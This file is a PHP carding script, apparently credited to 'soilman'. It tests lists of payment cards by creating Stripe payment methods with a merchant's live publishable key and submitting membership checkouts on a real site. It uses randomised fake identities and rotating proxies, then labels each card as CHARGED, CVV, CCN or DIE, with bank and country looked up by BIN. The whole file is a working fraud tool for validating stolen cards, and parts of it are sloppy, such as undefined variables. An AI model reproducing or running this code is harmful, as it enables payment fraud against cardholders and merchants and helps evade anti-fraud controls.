
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://commitment-club.com/membership-account/membership-checkout" ;
$amt = "accept" ;
$api = "001" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;
//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
$username = $matches1[1][0];
preg_match_all("(\"gender\":\"(.*)\")siU", $get, $matches1);
$gender = $matches1[1][0];
preg_match_all("(\"title\":\"(.*)\")siU", $get, $matches1);
$title = $matches1[1][0];
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"name\":\"(.*)\")siU", $get, $matches1);
$fullname = $matches1[1][0];
preg_match_all("(\"seed\":\"(.*)\")siU", $get, $matches1);
$password = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $get, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
/////////---------------HTTP PROXIES ONLY----------------///////////
function get_random_proxy($proxy_list_file)
{
    $proxies = file($proxy_list_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $selected_proxy = $proxies[array_rand($proxies)];
    return $selected_proxy;
}
$proxy = get_random_proxy('proxy.txt');
#echo 'selected proxy: ' . $proxy;
$ch = curl_init(CURLOPT_URL);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); // Use HTTP/HTTPS Proxy
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'username:password'); // Replace with your proxy credentials
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    #echo 'Error: ' . curl_error($ch);
} else {
    #echo 'Response: ' . $response;
}
curl_close($ch);
/////////---------------HTTP PROXIE END----------------///////////
$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'Accept: application/json',
'Accept-Language: en-US,en;q=0.5,en-US,en;q=0.6,en-US,en;q=0.7,en-US,en;q=0.8,en-US,en;q=0.9',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://js.stripe.com',
'Referer: https://js.stripe.com/',
'Sec-Ch-Ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'Sec-Ch-Ua-Mobile: ?0',
'Sec-Ch-Ua-Platform: "Windows"',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3780b0d3-6c37-4c01-831d-abb8d844af94caaa01&muid=d3e75520-a81e-4088-b457-8a259a63f37b459e23&sid=2d152761-6529-4c8a-93bd-28e2ce8965875e79e0&pasted_fields=number&payment_user_agent=stripe.js%2F3386b0e101%3B+stripe-js-v3%2F3386b0e101%3B+split-card-element&time_on_page=78502&key=pk_live_Zux5ZExdpuotQaaVvrnBXduS');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');
#$src = Getstr($result1,'client_secret":"','"');

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://commitment-club.com/membership-account/membership-checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Origin: https://commitment-club.com',
'Referer: https://commitment-club.com/membership-account/membership-checkout',
'Sec-Ch-Ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'Sec-Ch-Ua-Mobile: ?0',
'Sec-Ch-Ua-Platform: "Windows"',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username='.$username.'&password='.$password.'&password2='.$password.'&bemail='.$username.'%40gmail.com&bconfirmemail='.$username.'%40gmail.com&fullname=&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX5217&ExpirationMonth=07&ExpirationYear=2027');


$result2 = curl_exec($ch);
# ----------------[2req End]------------------#

#----------------[Bin Info]----------------#
$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$type = $fim['type'];
#----------------[Bin Info End]----------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:succeeded '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "insufficient funds.")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: INSUFFICIENT FUNDS </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
    exit;
    }

elseif(strpos($result2, "incorrect_zip")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: incorrect_zip </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: insufficient funds </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is invalid.')) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
    exit;
    }

elseif(strpos($result2, "Error updating default payment method. Your card's security code is incorrect.")) {

        echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
        exit;
        }
elseif(strpos($result2, "Your card's security code is incorrect")) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result: security code is incorrect </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span>  <br>☑️Result:  transaction_not_allowed </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
    exit;
    }
    
elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D 🆘  </span><br>🌐Proxy: '.$proxy.'</span><br>';
    exit;
    }
    
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ⛔ </span><br>🌐Proxy: '.$proxy.'</span><br>';
}

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR 📛 </span><br>🌐Proxy: '.$proxy.'</span><br>';
}

elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT 🚫 </span><br>🌐Proxy: '.$proxy.'</span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ ❗ </span><br>🌐Proxy: '.$proxy.'</span><br>';

}

elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline 🛑 </span><br>🌐Proxy: '.$proxy.'</span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline 💀 </span><br>🌐Proxy: '.$proxy.'</span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span><br>☑️Result:cvc_check_pass </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result: Membership Confirmation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank for your support!")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank for your support '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank you for your donation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Membership Confirm '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank You For Donation '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '💳CHARGED</span>  </span>CC:  '.$lista.'</span><br>☑️Result:Thank You '.$amt.' </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span><br>☑️Result:incorrect_cvc </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "invalid_cvc")) {

    echo '💳CCN</span>  </span>CC:  '.$lista.'</span><br>☑️Result:invalid_cvc </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '💳CVV</span>  </span>CC:  '.$lista.'</span><br>☑️Result:declined by your bank </span><br>🏦Bank : '.$bank.'</span><br>🗺️Country : '.$country.'</span><br>✅by : soilman'.$api.' </span><br>';
exit;
}

elseif(strpos($result2, 'Your card does not support this type of purchase.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: not support this type of purchase 🆘 </span><br>🌐Proxy: '.$proxy.'</span><br>';
}

elseif(strpos($result2, 'Your card is not supported.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED 🆘 </span><br>🌐Proxy: '.$proxy.'</span><br>';
}

else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>🌐Proxy: '.$proxy.'</span><br>';

}


curl_close($ch);
ob_flush();
#echo $result1;
#echo $result2;



?>